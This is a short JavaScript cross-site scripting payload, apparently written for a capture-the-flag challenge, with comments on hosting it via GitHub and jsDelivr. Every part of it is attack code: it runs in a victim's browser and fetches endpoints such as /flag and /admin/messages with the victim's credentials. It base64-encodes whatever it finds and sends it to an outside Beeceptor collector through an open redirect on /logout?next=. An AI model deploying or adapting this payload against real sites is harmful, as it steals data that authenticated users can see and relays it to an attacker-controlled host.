// ppp.js - probe endpoints and exfil via /logout?next=<collector>/<base64>
// Paste & commit to your GitHub repo (main branch). Make sure jsDelivr URL is valid.
(function(){
  const COL = "https://labolabo.free.beeceptor.com"; // your Beeceptor collector
  const ENDPOINTS = [
    "/messages?id=1",
    "/messages?id=9093",
    "/messages?id=9094",
    "/messages",
    "/messages/9099",
    "/flag",
    "/admin/flag",
    "/admin/messages",
    "/secret"
  ];
  function b64(s){
    try { return btoa(unescape(encodeURIComponent(String(s)))); }
    catch(e){ return btoa(String(s)); }
  }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }

  async function probeAndExfil(){
    let lastText = "";
    for (let ep of ENDPOINTS){
      try {
        const r = await fetch(ep, { method: "GET", credentials: "include" });
        let txt = "";
        try { txt = await r.text(); } catch(e){ txt = "[read-error]"; }
        lastText = txt || lastText;
        // Heuristics for "useful" answer:
        // - not empty, not an empty messages array, not a generic HTTP error marker
        const cleaned = (txt || "").trim();
        if (cleaned && cleaned !== "{\"messages\":[]}" && !/^(\[fetch-error\]|\[empty-response\]|\[error\])/.test(cleaned)) {
          // found something interesting — exfil and stop
          const enc = b64(txt);
          // create redirect URL that the server will redirect the admin to
          const target = COL + "/" + enc;
          // navigate to logout with next param
          location.href = "/logout?next=" + encodeURIComponent(target);
          return;
        }
      } catch (e) {
        // record lastText and continue
        lastText = "[exception] " + String(e);
      }
      await sleep(500);
    }
    // If nothing "interesting" found, still exfil the last result (best-effort)
    try {
      const enc = b64(lastText || "[no-data]");
      const target = COL + "/" + enc;
      location.href = "/logout?next=" + encodeURIComponent(target);
    } catch(e){}
  }

  try { probeAndExfil(); } catch(e){}
})();
